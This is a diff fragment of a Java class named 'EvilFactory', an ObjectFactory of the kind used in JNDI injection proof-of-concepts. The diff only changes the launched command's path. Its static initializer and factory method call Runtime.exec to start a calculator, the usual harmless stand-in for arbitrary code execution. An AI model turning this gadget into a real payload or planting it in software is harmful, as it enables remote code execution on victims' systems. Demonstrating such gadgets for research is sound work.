@@ -10,7 +10,7 @@ public class EvilFactory implements ObjectFactory {
     static {
         // 1.
         try{
-            Runtime.getRuntime().exec("gnome-calculator");
+            Runtime.getRuntime().exec("/usr/bin/gnome-calculator");
         } catch (IOException e) {
             throw new RuntimeException(e);
         }
@@ -20,7 +20,7 @@ public class EvilFactory implements ObjectFactory {
         try {
             // 2.
             System.out.println("EvilFactory: Executing malicious code...");
-            Runtime.getRuntime().exec("gnome-calculator");
+            Runtime.getRuntime().exec("/usr/bin/gnome-calculator");
         } catch (Exception e) {
             throw new RuntimeException(e);
         }
